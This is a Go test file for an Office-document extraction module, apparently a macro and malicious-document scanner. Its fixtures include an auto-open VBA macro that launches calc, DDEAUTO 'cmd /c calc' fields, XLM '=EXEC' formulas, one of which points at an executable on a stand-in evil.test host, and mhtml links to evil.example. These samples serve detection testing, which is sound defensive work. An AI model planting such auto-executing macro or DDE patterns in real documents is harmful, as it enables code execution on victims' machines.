package extract

import (
	"archive/zip"
	"bytes"
	"encoding/binary"
	"reflect"
	"strings"
	"testing"
	"time"

	"www.velocidex.com/golang/oleparse"
)

func assertP16cRetained(t *testing.T, ledger *retainedBudget, want uint64) {
	t.Helper()
	if want == 0 {
		t.Fatal("positive P16c fixture expected no retained bytes")
	}
	if got := ledger.snapshot().Bytes(); got != want {
		t.Fatalf("P16c retained bytes=%d want=%d", got, want)
	}
}

func TestP16cVBADuplicateAliasAccounting(t *testing.T) {
	res, ledger := p16bResult()
	parent := []byte("already-accounted-parent")
	if _, ok := ledger.recordBytes(parent); !ok {
		t.Fatal("failed to seed parent accounting")
	}
	code := []byte("Sub AutoOpen(): Shell \"calc\": End Sub")
	module := &oleparse.VBAModule{CodeBytes: code}
	out := codes(res, []*oleparse.VBAModule{module, module}, [][]byte{parent})

	want := uint64(len(parent) + 2*len(code))
	assertP16cRetained(t, ledger, want)
	if len(out) != 3 || len(res.VBAStreams) != 2 {
		t.Fatalf("duplicate modules changed: streams=%d VBA aliases=%d", len(out), len(res.VBAStreams))
	}
	for i := range res.VBAStreams {
		if !bytes.Equal(res.VBAStreams[i], code) || &res.VBAStreams[i][0] != &out[i+1][0] {
			t.Fatalf("VBA alias %d is not the accepted code entry", i)
		}
	}
}

func TestP16cLocalSinkAccounting(t *testing.T) {
	t.Run("ppt_marker", func(t *testing.T) {
		res, ledger := p16bResult()
		res.Streams = append(res.Streams, []byte("macro source"))
		emitPPTVBAMarkerIfProduced(res, 0)
		assertP16cRetained(t, ledger, uint64(len("PPT-VBA-EXTRACTED")))
	})

	t.Run("ppt_marker_absent_without_code", func(t *testing.T) {
		res, ledger := p16bResult()
		emitPPTVBAMarkerIfProduced(res, 0)
		if len(res.Streams) != 0 || ledger.snapshot().Bytes() != 0 {
			t.Fatalf("empty PPT emitted streams=%d retained=%d", len(res.Streams), ledger.snapshot().Bytes())
		}
	})

	t.Run("default_password_marker", func(t *testing.T) {
		res, ledger := p16bResult()
		emitDefaultPWMarker(res)
		assertP16cRetained(t, ledger, uint64(len("DEFAULTPW-DECRYPTED")))
	})

	t.Run("default_password_xor", func(t *testing.T) {
		workbook := append(biffBOF(), biffFilePasXOR(0, computeVerifierForTest(velvetPassword))...)
		workbook = append(workbook, 0x0a, 0x00, 0x00, 0x00)
		buf := buildCFB(t, []cfbEntry{
			{name: "Root Entry", mse: 5},
			{name: "Workbook", mse: 2, data: workbook},
		})
		res, ledger := p16bResult()
		fromDefaultPWXOR(parseP16bOLE(t, buf), res, time.Time{})
		assertP16cRetained(t, ledger, uint64(len("DEFAULTPW-DECRYPTED")))
	})

	t.Run("relationships", func(t *testing.T) {
		body := `<Relationships><Relationship Type="http://schemas.example/hyperlink" Target="https://evil.example/a" TargetMode="External"/></Relationships>`
		buf := buildZip(t, map[string][]byte{"word/_rels/document.xml.rels": []byte(body)})
		zr, err := zip.NewReader(bytes.NewReader(buf), int64(len(buf)))
		if err != nil {
			t.Fatal(err)
		}
		res, ledger := p16bResult()
		var out [][]byte
		fromOOXMLRels(zr, &out, time.Time{}, res)
		assertP16cRetained(t, ledger, uint64(len("OOXML-EXTERNAL-REL hyperlink https://evil.example/a")))
	})

	t.Run("mhtml_relationship", func(t *testing.T) {
		target := "mhtml:https://evil.example/a!x-usc:https://evil.example/b"
		body := `<Relationships><Relationship Type="http://schemas.example/hyperlink" Target="` + target + `" TargetMode="External"/></Relationships>`
		buf := buildZip(t, map[string][]byte{"word/_rels/document.xml.rels": []byte(body)})
		zr, err := zip.NewReader(bytes.NewReader(buf), int64(len(buf)))
		if err != nil {
			t.Fatal(err)
		}
		res, ledger := p16bResult()
		var out [][]byte
		fromOOXMLRels(zr, &out, time.Time{}, res)
		assertP16cRetained(t, ledger, uint64(len("OOXML-MHTML-REL hyperlink "+target)))
	})

	t.Run("dde", func(t *testing.T) {
		res, ledger := p16bResult()
		var out [][]byte
		parseDDEFields([]byte(`<w:fldSimple w:instr="DDEAUTO cmd /c calc"/>`), &out, time.Time{}, res)
		assertP16cRetained(t, ledger, uint64(len("OOXML-DDE-FIELD DDEAUTO cmd /c calc")))
	})

	t.Run("hidden_xlm", func(t *testing.T) {
		buf := buildZip(t, map[string][]byte{"xl/workbook.xml": []byte(`<workbook><sheets><sheet name="HiddenMacro" state="veryHidden"/></sheets></workbook>`)})
		zr, err := zip.NewReader(bytes.NewReader(buf), int64(len(buf)))
		if err != nil {
			t.Fatal(err)
		}
		idx := map[string]*zip.File{"xl/workbook.xml": zr.File[0]}
		res, ledger := p16bResult()
		var out [][]byte
		fromOOXMLXLM(idx, true, &out, time.Time{}, res)
		assertP16cRetained(t, ledger, uint64(len("XLM-HIDDEN-MACROSHEET veryHidden HiddenMacro")))
	})

	t.Run("folded_xlm_and_marker", func(t *testing.T) {
		res, ledger := p16bResult()
		var out [][]byte
		total := 0
		if !emitFoldedFormula("=EXEC(calc.exe)", &out, &total, true, res) {
			t.Fatal("folded XLM fixture rejected")
		}
		want := len("=EXEC(calc.exe)") + len("XLM-DANGEROUS-FUNC EXEC")
		assertP16cRetained(t, ledger, uint64(want))
	})

	t.Run("ooxml_fold_pipeline", func(t *testing.T) {
		buf := makeOOXMLWithXLMFold(t, []string{`=EXEC("calc.exe")`})
		zr, err := zip.NewReader(bytes.NewReader(buf), int64(len(buf)))
		if err != nil {
			t.Fatal(err)
		}
		res, ledger := p16bResult()
		var out [][]byte
		fromOOXMLXLMFold(zr, &out, time.Time{}, nil, res)
		wantOut := [][]byte{
			[]byte("XLM-EMUL-DEPTH shallow"),
			[]byte("=EXEC(calc.exe)"),
			[]byte("XLM-DANGEROUS-FUNC EXEC"),
		}
		if !reflect.DeepEqual(out, wantOut) {
			t.Fatalf("OOXML fold output=%q want=%q", out, wantOut)
		}
		assertP16cRetained(t, ledger, 60)
	})

	t.Run("xlsb_fold_pipeline", func(t *testing.T) {
		buf := buildXLSB(t, "xl/macrosheets/sheet1.bin", "http://evil.test/x.exe")
		zr, err := zip.NewReader(bytes.NewReader(buf), int64(len(buf)))
		if err != nil {
			t.Fatal(err)
		}
		res, ledger := p16bResult()
		var out [][]byte
		fromXLSBXLMFold(zr, &out, time.Time{}, nil, res)
		wantOut := [][]byte{
			[]byte("=EXEC(http://evil.test/x.exe)"),
			[]byte("XLM-DANGEROUS-FUNC EXEC"),
			[]byte("XLM-EMUL-DEPTH shallow"),
		}
		if !reflect.DeepEqual(out, wantOut) {
			t.Fatalf("XLSB fold output=%q want=%q", out, wantOut)
		}
		assertP16cRetained(t, ledger, 74)
	})

	t.Run("xlsb_fold_output_cap", func(t *testing.T) {
		buf := buildXLSB(t, "xl/macrosheets/sheet1.bin", "http://evil.test/x.exe")
		zr, err := zip.NewReader(bytes.NewReader(buf), int64(len(buf)))
		if err != nil {
			t.Fatal(err)
		}
		res, ledger := p16bResult()
		var out [][]byte
		total := maxXLMFoldOutputLen
		processXLSBSheet(zr.File[0], nil, &out, &total, time.Time{}, maxXLMFoldFormulas, res)
		if len(out) != 0 || ledger.snapshot().Bytes() != 0 {
			t.Fatalf("capped XLSB output=%q retained=%d", out, ledger.snapshot().Bytes())
		}
	})

	t.Run("emulator_evaluated_output_cap", func(t *testing.T) {
		res, ledger := p16bResult()
		var out [][]byte
		total := maxXLMFoldOutputLen
		emitEvaluatedXLMCells([]xlmCell{{coord: "A1", formula: `="payload0"`}}, &out, &total, time.Time{}, res)
		if len(out) != 0 || ledger.snapshot().Bytes() != 0 {
			t.Fatalf("capped evaluated output=%q retained=%d", out, ledger.snapshot().Bytes())
		}
	})

	t.Run("interpreter_output_caps", func(t *testing.T) {
		for _, cell := range []xlmCell{{coord: "A1", formula: `="payload0"`}, {coord: "A1", value: "payload0"}} {
			res, ledger := p16bResult()
			var out [][]byte
			total := maxXLMFoldOutputLen
			interpretXLMCells([]xlmCell{cell}, &out, &total, time.Time{}, res)
			if len(out) != 0 || ledger.snapshot().Bytes() != 0 {
				t.Fatalf("capped interpreter output=%q retained=%d", out, ledger.snapshot().Bytes())
			}
		}
	})

	t.Run("biff_markers", func(t *testing.T) {
		namePayload := make([]byte, 15)
		namePayload[0] = 0x20
		namePayload[3] = 1
		namePayload[14] = 1
		boundPayload := []byte{0, 0, 0, 0, 1, 1, 5, 0, 'M', 'a', 'c', 'r', 'o'}
		workbook := make([]byte, 0, 8+len(namePayload)+len(boundPayload))
		workbook = binary.LittleEndian.AppendUint16(workbook, 0x0018)
		workbook = binary.LittleEndian.AppendUint16(workbook, uint16(len(namePayload)))
		workbook = append(workbook, namePayload...)
		workbook = binary.LittleEndian.AppendUint16(workbook, 0x0085)
		workbook = binary.LittleEndian.AppendUint16(workbook, uint16(len(boundPayload)))
		workbook = append(workbook, boundPayload...)
		res, ledger := p16bResult()
		scanBIFFXLMStream(workbook, res, time.Time{})
		want := len("XLM-AUTO-OPEN") + len("XLM-HIDDEN-MACROSHEET hidden Macro")
		assertP16cRetained(t, ledger, uint64(want))
	})

	t.Run("docprops", func(t *testing.T) {
		buf := buildZip(t, map[string][]byte{"docProps/core.xml": []byte(`<coreProperties><title>malicious-title</title></coreProperties>`)})
		zr, err := zip.NewReader(bytes.NewReader(buf), int64(len(buf)))
		if err != nil {
			t.Fatal(err)
		}
		res, ledger := p16bResult()
		var out [][]byte
		fromOOXMLDocProps(zr, &out, time.Time{}, res)
		want := len("malicious-title") + len("DOCPROPS-STRINGS\nmalicious-title")
		assertP16cRetained(t, ledger, uint64(want))
	})

	t.Run("xlsb_dde", func(t *testing.T) {
		buf := buildXLSBExternalDDE(t, 1, "cmd", "/c calc")
		zr, err := zip.NewReader(bytes.NewReader(buf), int64(len(buf)))
		if err != nil {
			t.Fatal(err)
		}
		res, ledger := p16bResult()
		var out [][]byte
		fromXLSBExternalDDE(zr, &out, time.Time{}, res)
		assertP16cRetained(t, ledger, uint64(len("XLSB-DDE cmd|/c calc")))
	})
}

func TestP16cBoundaryAndMalformedRecordNothing(t *testing.T) {
	t.Run("fold_below_minimum", func(t *testing.T) {
		res, ledger := p16bResult()
		var out [][]byte
		total := 0
		if !emitFoldedFormula(strings.Repeat("x", minXLMFoldResult-1), &out, &total, false, res) {
			t.Fatal("below-minimum XLM value stopped scanning")
		}
		if len(out) != 0 || ledger.snapshot().Bytes() != 0 {
			t.Fatalf("below-minimum output=%d retained=%d", len(out), ledger.snapshot().Bytes())
		}
	})

	t.Run("fold_exact_minimum", func(t *testing.T) {
		res, ledger := p16bResult()
		var out [][]byte
		total := 0
		if !emitFoldedFormula(strings.Repeat("x", minXLMFoldResult), &out, &total, false, res) {
			t.Fatal("exact-minimum XLM value rejected")
		}
		assertP16cRetained(t, ledger, uint64(minXLMFoldResult))
	})

	t.Run("malformed_dde_and_xlsb", func(t *testing.T) {
		res, ledger := p16bResult()
		var out [][]byte
		parseDDEFields([]byte(`<broken`), &out, time.Time{}, res)
		scanXLSBSupBookDDE([]byte{0xff}, &out, res)
		codes(res, []*oleparse.VBAModule{nil, &oleparse.VBAModule{}}, out)
		if len(out) != 0 || ledger.snapshot().Bytes() != 0 {
			t.Fatalf("malformed output=%d retained=%d", len(out), ledger.snapshot().Bytes())
		}
	})
}
